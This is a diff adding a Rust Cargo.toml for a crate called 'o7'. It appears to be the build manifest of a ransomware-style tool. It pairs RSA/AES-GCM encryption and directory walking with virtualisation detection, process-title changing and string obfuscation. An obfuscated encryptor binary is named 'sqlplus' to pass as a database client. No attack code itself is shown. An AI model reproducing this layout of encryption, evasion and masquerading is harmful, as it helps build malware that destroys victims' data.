@@ -1,0 +1,29 @@
+[package]
+name = "o7"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+windows = "0.58.0"
+rsa = "0.9.6"
+aes-gcm = "0.10.3"
+walkdir = "2.5.0"
+rand = "0.8.5"
+sha2 = "0.10.8"
+libc = "0.2.155"
+heim-virt = "0.0.11"
+reqwest = "0.12.5"
+proctitle = "0.1.1"
+cryptify = "3.1.1"
+winapi = "0.3.5"
+tokio = "1.38.1"
+
+[[bin]]
+name = "linuxenc"
+path = "src/encrypt.rs"
+target = "linux"
+
+[[bin]]
+name = "sqlplus"
+path = "src/obf_encrypt.rs"
+target = "linux"
